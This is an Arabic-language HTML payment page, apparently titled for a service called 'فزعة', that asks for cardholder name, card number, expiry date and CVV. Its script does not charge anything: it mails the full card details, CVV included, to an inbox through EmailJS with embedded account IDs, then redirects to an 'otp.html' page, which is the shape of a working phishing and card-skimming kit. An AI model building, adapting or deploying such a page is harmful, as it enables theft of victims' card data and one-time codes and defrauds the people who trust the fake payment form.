<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دفع رسوم البطاقة - فزعة</title>
    <!-- نفس الخط المستخدم في صفحة index -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <!-- استدعاء مكتبة EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // ضع PUBLIC_KEY الخاص بك هنا
            emailjs.init("yWQSUKCrx-0f02aeK");
        })();
    </script>

    <style>
        /* التنسيقات الأساسية المنسوخة من الصفحة الرئيسية */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Tajawal', sans-serif;
        }
        body {
            background-color: #f4f4f4;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            overflow: hidden;
            min-height: 100vh;
        }
        
        /* تصميم الترويسة */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background-color: #fff;
            border-bottom: 2px solid #eee;
        }
        .header-title {
            text-align: center;
            flex-grow: 1;
        }
        .header-title h1 {
            color: #c91c23;
            font-size: 20px;
            font-weight: 800;
        }

        /* قسم النموذج */
        .form-section {
            padding: 30px 20px;
        }
        
        .secure-badge {
            text-align: center;
            color: #219d8e;
            font-weight: 700;
            margin-bottom: 20px;
            font-size: 14px;
        }

        /* حقول الإدخال */
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 700;
            color: #555;
            font-size: 14px;
        }
        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s;
        }
        .input-field:focus {
            border-color: #1a365d;
        }

        /* شبكة لحقول التاريخ والرمز السري */
        .form-row {
            display: flex;
            gap: 15px;
        }
        .form-row .input-group {
            flex: 1;
        }

        /* تنسيق صور البطاقات */
        .card-icons {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            margin-top: 10px;
            margin-bottom: 15px;
        }
        .card-icons img {
            height: 24px; /* تحكم بحجم البطاقات من هنا */
            width: auto;
            object-fit: contain;
        }

        /* زر الإرسال بنفس تصميم الصفحة الأصلية */
        .btn-submit {
            display: block;
            background-color: #1a365d;
            color: white;
            border: none;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
            width: 100%;
            margin: 15px auto 0;
            border-radius: 3px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-submit:hover {
            background-color: #122540;
        }

        /* رسالة النجاح/الخطأ */
        #status-message {
            text-align: center;
            margin-top: 15px;
            font-weight: bold;
            font-size: 15px;
            display: none;
        }
        .success { color: #219d8e; }
        .error { color: #c91c23; }
    </style>
</head>
<body>

<div class="container">
    <div class="form-section">
        <div class="secure-badge">
            ادخل معلومات الدفع
        </div>

        <form id="payment-form">
            <div class="input-group">
                <label for="card_name">الاسم على البطاقة</label>
                <input type="text" id="card_name" name="card_name" class="input-field" placeholder="" required>
            </div>

            <div class="input-group">
                <label for="card_number">رقم البطاقة</label>
                <!-- التوجيه من اليسار لليمين لسهولة كتابة الأرقام -->
                <input type="text" id="card_number" name="card_number" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19" dir="ltr" style="text-align: right;" required>
            </div>

            <div class="form-row">
                <div class="input-group">
                    <label for="expiry_date">تاريخ الانتهاء</label>
                    <input type="text" id="expiry_date" name="expiry_date" class="input-field" placeholder="MM/YY" maxlength="5" dir="ltr" style="text-align: right;" required>
                </div>
                
                <div class="input-group">
                    <label for="cvv">رمز التحقق (CVV)</label>
                    <input type="password" id="cvv" name="cvv" class="input-field" placeholder="123" maxlength="4" dir="ltr" style="text-align: right;" required>
                </div>
            </div>

            <!-- إضافة صور البطاقات المتاحة هنا -->
            <div class="card-icons">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQm4l_KI6WDo_uzZPNt5nTI2VoNznLW257-YlGj3Nhzg&s=10" alt="Mada">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTXyrfXvDM4izgeeVvz6ksuXMj2C7Y1IV5xzOPSXWgRQ&s=10" alt="Visa">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express">
            </div>

            <button type="submit" class="btn-submit" id="submit-btn">إتمام الدفع</button>
            <div id="status-message"></div>
        </form>
    </div>
</div>

<script>
    const form = document.getElementById('payment-form');
    const submitBtn = document.getElementById('submit-btn');
    const statusMessage = document.getElementById('status-message');

    // تنسيق رقم البطاقة ليضيف مسافة كل 4 أرقام
    document.getElementById('card_number').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    // تنسيق تاريخ الانتهاء ليضيف شريطة مائلة (/)
    document.getElementById('expiry_date').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim().slice(0, 5);
    });

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // منع إعادة تحميل الصفحة
        
        // تغيير حالة الزر أثناء الإرسال
        submitBtn.textContent = 'جاري المعالجة...';
        submitBtn.disabled = true;
        statusMessage.style.display = 'none';
        statusMessage.className = '';

        // ضع SERVICE_ID و TEMPLATE_ID الخاصة بك هنا
        const serviceID = 'service_97hvlam';
        const templateID = 'template_4tznbve';

        // إرسال النموذج عبر EmailJS
        emailjs.sendForm(serviceID, templateID, this)
            .then(function() {
                // في حال النجاح
                submitBtn.textContent = 'إتمام الدفع';
                submitBtn.disabled = false;
                statusMessage.textContent = 'تم إرسال تفاصيل الدفع بنجاح!';
                statusMessage.className = 'success';
                statusMessage.style.display = 'block';
                form.reset();
                
                // يمكنك توجيه المستخدم لصفحة أخرى هنا
                window.location.href = "otp.html";
            }, function(error) {
                // في حال الفشل
                submitBtn.textContent = 'إتمام الدفع';
                submitBtn.disabled = false;
                statusMessage.textContent = 'حدث خطأ أثناء المعالجة، يرجى المحاولة مرة أخرى.';
                statusMessage.className = 'error';
                statusMessage.style.display = 'block';
                console.log('FAILED...', error);
            });
    });
</script>

</body>
</html>
